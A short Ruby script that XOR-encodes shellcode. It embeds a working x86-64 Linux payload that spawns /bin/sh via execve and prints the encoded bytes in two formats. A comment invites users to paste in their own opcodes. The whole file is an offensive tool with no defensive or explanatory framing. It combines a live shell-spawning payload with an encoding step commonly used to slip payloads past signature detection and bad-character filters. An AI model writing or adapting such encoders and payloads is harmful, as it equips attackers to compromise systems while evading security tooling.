#!/usr/bin/ruby

#Ruby XOR Encoder Shellcodes

#Put your opcodes here!
shellcode="\xeb\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\x48\x83\xc0\x3b\x0f\x05\xe8\xde\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43"

puts "\e[1m\e[32mEncoding Shellcode...\e[0m\n\n"

encoded = String.new
encoded2 = String.new

shellcode.each_byte do |byte|
    xor = byte^0xAA
    encoded << '\\x'
    encoded << xor.to_s(16)

    encoded2 << '0x'
    encoded2 << xor.to_s(16)
    encoded2 << ','

end


puts "\e[1m\e[32m[ Type \\x01... ]\e[0m"
puts encoded
puts ""
puts "\e[1m\e[32m[ Type 0x02... ]\e[0m"
puts encoded2
